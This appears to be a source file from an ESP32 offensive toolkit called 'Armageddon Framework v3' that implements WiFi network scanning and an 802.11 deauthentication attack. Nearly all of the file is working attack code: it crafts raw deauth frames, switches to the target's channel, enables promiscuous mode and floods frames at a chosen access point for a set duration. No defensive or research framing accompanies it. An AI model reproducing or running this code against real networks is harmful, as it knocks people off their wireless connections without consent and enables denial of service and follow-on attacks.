/* Armageddon Framework v3 - wifi_attacks.cpp
 * Implémentation WiFi Scan + Deauth avec gestion AP/channel
 * CRITIQUE : Deauth efficace + gestion conflit AP
 */

#include "wifi_attacks.h"
#include "wifi_init.h"
#include "framework.h"
#include <esp_wifi.h>
#include <esp_netif.h>
#include <esp_mac.h>
#include <esp_task_wdt.h>
#include <string.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>

static const char *TAG = "WIFI_ATTACKS";

// ============ STATE VARIABLES ============
static wifi_scan_result_t scan_results = {0};
static bool deauth_active = false;
static uint32_t deauth_packets_sent = 0;
static deauth_params_t current_deauth = {0};
static TaskHandle_t deauth_task_handle = NULL;

// ============ DEAUTH FRAME STRUCTURES ============

/* 802.11 Deauth Frame Template */
typedef struct {
    uint8_t frame_control[2];
    uint8_t duration[2];
    uint8_t dest_addr[6];
    uint8_t src_addr[6];
    uint8_t bssid[6];
    uint8_t seq_ctrl[2];
    uint8_t reason_code[2];
    uint8_t fcs[4];
} deauth_frame_t;

// ============ DEAUTH FRAME BUILDER ============
static void build_deauth_frame(uint8_t *frame, const uint8_t *dest, 
                                const uint8_t *src, const uint8_t *bssid) {
    deauth_frame_t *deauth = (deauth_frame_t *)frame;
    
    // Frame Control: Type=0 (Management), Subtype=12 (Deauthentication)
    deauth->frame_control[0] = 0xC0;  // Type 00, Subtype 11
    deauth->frame_control[1] = 0x00;
    
    // Duration/ID
    deauth->duration[0] = 0x3A;
    deauth->duration[1] = 0x01;
    
    // Destination address (STA)
    memcpy(deauth->dest_addr, dest, 6);
    
    // Source address (AP)
    memcpy(deauth->src_addr, src, 6);
    
    // BSSID
    memcpy(deauth->bssid, bssid, 6);
    
    // Sequence Control
    static uint16_t seq_num = 0;
    deauth->seq_ctrl[0] = (seq_num & 0xFF);
    deauth->seq_ctrl[1] = ((seq_num >> 8) & 0x0F);
    seq_num++;
    
    // Reason Code: 2 (PREV_AUTH_NOT_VALID)
    deauth->reason_code[0] = 0x02;
    deauth->reason_code[1] = 0x00;
    
    // FCS (will be calculated by hardware)
    memset(deauth->fcs, 0, 4);
}

// ============ DEAUTH TASK ============
static void deauth_task(void *pvParameters) {
    deauth_params_t *params = (deauth_params_t *)pvParameters;
    TickType_t start_time_ticks = xTaskGetTickCount();
    TickType_t duration_ticks = pdMS_TO_TICKS(params->duration_ms);
    uint8_t deauth_frame[26] = {0};  // Deauth frame: 26 bytes
    
    ESP_LOGI(TAG, "Deauth task started for " MACSTR " on channel %d",
             MAC2STR(params->target_bssid), params->channel);
    
    deauth_packets_sent = 0;
    deauth_active = true;
    
    // Create deauth frame (from AP to STA)
    build_deauth_frame(deauth_frame, params->target_bssid, 
                       params->target_bssid, params->target_bssid);
    
    // Spam deauth frames
    while (deauth_active && 
           (xTaskGetTickCount() - start_time_ticks) < duration_ticks) {
        
        // Send DEAUTH_FRAMES_PER_BURST frames per burst
        for (int i = 0; i < DEAUTH_FRAMES_PER_BURST; i++) {
            if (esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false) == ESP_OK) {
                deauth_packets_sent++;
            }
            
            // Reset watchdog every few packets
            if ((deauth_packets_sent % 5) == 0) {
                esp_task_wdt_reset();
            }
        }
        
        vTaskDelay(pdMS_TO_TICKS(DEAUTH_BURST_DELAY_MS));
    }
    
    ESP_LOGI(TAG, "Deauth task finished. Packets sent: %ld", deauth_packets_sent);
    deauth_active = false;
    
    // Restart AP after deauth
    ESP_LOGI(TAG, "Restarting AP after deauth attack");
    wifi_restart_ap();
    
    vTaskDelete(NULL);
}

// ============ INITIALIZATION ============
esp_err_t wifi_attacks_init(void) {
    ESP_LOGI(TAG, "Initializing WiFi attacks subsystem");
    memset(&scan_results, 0, sizeof(wifi_scan_result_t));
    deauth_active = false;
    deauth_packets_sent = 0;
    return ESP_OK;
}

// ============ SCAN IMPLEMENTATION ============
esp_err_t wifi_scan_networks(void) {
    if (scan_results.scanning) {
        ESP_LOGW(TAG, "Scan already in progress");
        return ESP_ERR_INVALID_STATE;
    }
    
    ESP_LOGI(TAG, "Starting WiFi scan");
    scan_results.scanning = true;
    scan_results.count = 0;
    
    // Configure scan
    wifi_scan_config_t scan_config = {
        .ssid = NULL,
        .bssid = NULL,
        .channel = 0,           // Scan all channels
        .show_hidden = true,
        .scan_type = WIFI_SCAN_TYPE_ACTIVE,
        .scan_time = {
            .active = {
                .min = 0,
                .max = 120     // ~120ms per channel
            }
        }
    };
    
    // Start scan
    esp_err_t ret = esp_wifi_scan_start(&scan_config, true);  // true = blocking
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Failed to start WiFi scan: %s", esp_err_to_name(ret));
        scan_results.scanning = false;
        return ret;
    }
    
    // Get scan results
    uint16_t ap_count = 0;
    ret = esp_wifi_scan_get_ap_num(&ap_count);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Failed to get AP count: %s", esp_err_to_name(ret));
        scan_results.scanning = false;
        return ret;
    }
    
    ap_count = (ap_count > 50) ? 50 : ap_count;  // Max 50 networks
    scan_results.count = ap_count;
    
    // Fetch each network
    for (uint16_t i = 0; i < ap_count; i++) {
        wifi_ap_record_t ap_record;
        ret = esp_wifi_scan_get_ap_record(&ap_record);
        if (ret != ESP_OK) {
            break;
        }
        
        // Copy SSID
        strncpy((char *)scan_results.networks[i].ssid, 
                (const char *)ap_record.ssid, 32);
        scan_results.networks[i].ssid[32] = '\0';
        
        // Copy BSSID
        memcpy(scan_results.networks[i].bssid, ap_record.bssid, 6);
        
        // Signal strength
        scan_results.networks[i].rssi = ap_record.rssi;
        
        // Channel
        scan_results.networks[i].channel = ap_record.primary;
        
        // Security
        scan_results.networks[i].is_secure = (ap_record.authmode != WIFI_AUTH_OPEN);
        scan_results.networks[i].auth_mode = ap_record.authmode;
        
        ESP_LOGI(TAG, "Found: %s (ch:%d, rssi:%d)", 
                 scan_results.networks[i].ssid,
                 scan_results.networks[i].channel,
                 scan_results.networks[i].rssi);
    }
    
    // Clean up
    esp_wifi_scan_stop();
    esp_wifi_clear_ap_list();
    
    scan_results.scanning = false;
    scan_results.last_scan_ms = pdTICKS_TO_MS(xTaskGetTickCount());
    
    ESP_LOGI(TAG, "Scan complete. Found %d networks", ap_count);
    return ESP_OK;
}

uint16_t wifi_scan_get_count(void) {
    return scan_results.count;
}

esp_err_t wifi_scan_get_network(uint16_t idx, char *ssid, uint8_t *bssid,
                                int8_t *rssi, uint8_t *channel, bool *is_secure) {
    if (idx >= scan_results.count) {
        return ESP_ERR_INVALID_ARG;
    }
    
    if (ssid) strncpy(ssid, (const char *)scan_results.networks[idx].ssid, 32);
    if (bssid) memcpy(bssid, scan_results.networks[idx].bssid, 6);
    if (rssi) *rssi = scan_results.networks[idx].rssi;
    if (channel) *channel = scan_results.networks[idx].channel;
    if (is_secure) *is_secure = scan_results.networks[idx].is_secure;
    
    return ESP_OK;
}

// ============ DEAUTH IMPLEMENTATION ============
esp_err_t wifi_deauth_start(const deauth_params_t *params) {
    if (!params) {
        return ESP_ERR_INVALID_ARG;
    }
    
    if (deauth_active) {
        ESP_LOGW(TAG, "Deauth already in progress");
        return ESP_ERR_INVALID_STATE;
    }
    
    // Save params
    memcpy(&current_deauth, params, sizeof(deauth_params_t));
    
    // CRITICAL: Stop AP to allow channel switching
    ESP_LOGI(TAG, "Stopping AP for channel switching");
    esp_err_t ret = wifi_stop_ap();
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Failed to stop AP");
        return ret;
    }
    
    vTaskDelay(pdMS_TO_TICKS(100));
    
    // Switch to target channel
    ESP_LOGI(TAG, "Switching to target channel %d", params->channel);
    ret = wifi_start_sta(params->channel);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Failed to start STA on target channel");
        return ret;
    }
    
    vTaskDelay(pdMS_TO_TICKS(200));
    
    // Enable promiscuous mode for raw frame injection
    ret = wifi_set_promiscuous(true);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Failed to enable promiscuous mode");
        return ret;
    }
    
    // Create deauth task
    ret = xTaskCreatePinnedToCore(deauth_task, "deauth_task", 4096, 
                                   (void *)&current_deauth, 10, 
                                   &deauth_task_handle, 1);
    if (ret != pdPASS) {
        ESP_LOGE(TAG, "Failed to create deauth task");
        return ESP_ERR_NO_MEM;
    }
    
    return ESP_OK;
}

esp_err_t wifi_deauth_stop(void) {
    if (!deauth_active) {
        return ESP_ERR_INVALID_STATE;
    }
    
    ESP_LOGI(TAG, "Stopping deauth attack");
    deauth_active = false;
    
    // Wait for task to finish
    if (deauth_task_handle) {
        vTaskDelay(pdMS_TO_TICKS(500));
        deauth_task_handle = NULL;
    }
    
    return ESP_OK;
}

esp_err_t wifi_deauth_get_status(uint32_t *packets_sent, bool *active) {
    if (packets_sent) *packets_sent = deauth_packets_sent;
    if (active) *active = deauth_active;
    return ESP_OK;
}

bool wifi_deauth_is_active(void) {
    return deauth_active;
}
